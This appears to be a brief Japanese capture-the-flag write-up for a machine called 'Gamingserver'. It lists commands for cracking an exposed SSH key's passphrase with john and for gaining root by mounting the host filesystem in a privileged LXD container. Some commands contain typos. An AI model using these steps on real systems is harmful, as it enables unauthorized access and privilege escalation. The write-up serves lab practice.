---
title: "Gamingserver"
date: 2024-03-16T13:24:19+09:00
draft: false
---

### user.txt

- /secret
  - secretKey がある -> ssh 鍵
- /uploads
  - dict.lst -> ssh パスワード鍵候補？
- ```ssh2john secretKey > hash.txt```
- ```john —wordlist=dict.lst hash.txt```
  - ssh ログイン
  - ユーザ名はソースコードから読む
  - このパターンどうにかならんのか

### root.txt

- john が lxd ユーザなのでこれを使う
- alpine イメージのビルド
  - ```git clone https://github.com/saghul/lxd-alpine-builder.git```
  - ```cd .lxd-alpine-builder```
  - ```/build-alpine```
- イメージ作成（管理者権限付き）
  - ```lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myContainer```
  - ```lxc init myContainer myVM -c security.privileged=true```
  - ```lxc config device add myVM mydevice disk source=/ path=/mnt/root recursive=true```
- 起動
  - ```lxc start myVM```
  - ```lxc exec myVM /bin/sh```
